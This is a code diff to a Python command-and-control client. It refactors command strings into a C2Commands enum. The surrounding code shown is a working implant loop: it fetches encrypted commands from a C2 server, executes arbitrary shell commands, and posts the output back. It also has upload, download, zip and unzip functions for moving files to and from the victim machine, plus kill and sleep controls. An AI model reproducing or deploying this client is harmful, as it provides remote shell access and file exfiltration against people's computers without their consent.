@@ -10,7 +10,7 @@ from requests import exceptions, get, post, put
 from crypt import cipher
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from settings import PORT, C2_SERVER, CMD_REQUEST, FILE_REQUEST, RESPONSE_PATH, CWD_RESPONSE, \
-                ZIP_PASSWORD, FILE_SEND, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
+                ZIP_PASSWORD, FILE_SEND, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode, C2Commands
 
 
 timestamp = str(int(time.time()))
@@ -51,7 +51,7 @@ while True:
 
     cmd = cipher.decrypt(response.content).decode()
 
-    if cmd.startswith("cd "): # cd command
+    if cmd.startswith(C2Commands.CD.value): # cd command
         dir = cmd[3:]
         try:
             chdir(dir)
@@ -66,11 +66,11 @@ while True:
         else:
             post_to_server(getcwd(), CWD_RESPONSE) # encode of getcwd needed
 
-    elif not cmd.startswith('client'):
+    elif not cmd.startswith(C2Commands.CLS.value):
         cmd_output = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
         post_to_server(cmd_output.stdout.decode())
 
-    elif cmd.startswith('client download'):
+    elif cmd.startswith(C2Commands.CLS_DWN.value):
         filepath = get_filename(cmd)
         if filepath is None: #IndexError / start new iteration
             continue
@@ -86,7 +86,7 @@ while True:
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to write {filename} to disk on {client}.\n")
 
-    elif cmd.startswith('client upload'):
+    elif cmd.startswith(C2Commands.CLS_UP.value):
         filepath = get_filename(cmd)
         if filepath is None: #IndexError / start new iteration
             continue
@@ -99,7 +99,7 @@ while True:
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on {client}.\n")
         
-    elif cmd.startswith('client zip'):
+    elif cmd.startswith(C2Commands.CLS_ZIP.value):
         filepath = get_filename(cmd)
         if filepath is None: #IndexError / start new iteration
             continue
@@ -118,7 +118,7 @@ while True:
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on {client}.\n")
 
-    elif cmd.startswith('client unzip'):
+    elif cmd.startswith(C2Commands.CLS_UZIP.value):
         filepath = get_filename(cmd)
         if filepath is None: #IndexError / start new iteration
             continue
@@ -130,11 +130,11 @@ while True:
                 post_to_server(f"{filepath} is now unzip and decrypted on the client.\n")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"{filepath} was not found on the client.\n")
-    elif cmd.startswith('client kill'): # kill command
+    elif cmd.startswith(C2Commands.CLS_KLL.value): # kill command
         post_to_server(f"{client} has been killed.\n")
         exit()
 
-    elif cmd.startswith('client sleep '): # sleep command
+    elif cmd.startswith(C2Commands.CLS_SLP.value): # sleep command
         try:
             delay = float(cmd.split()[2])
             if delay < 0:
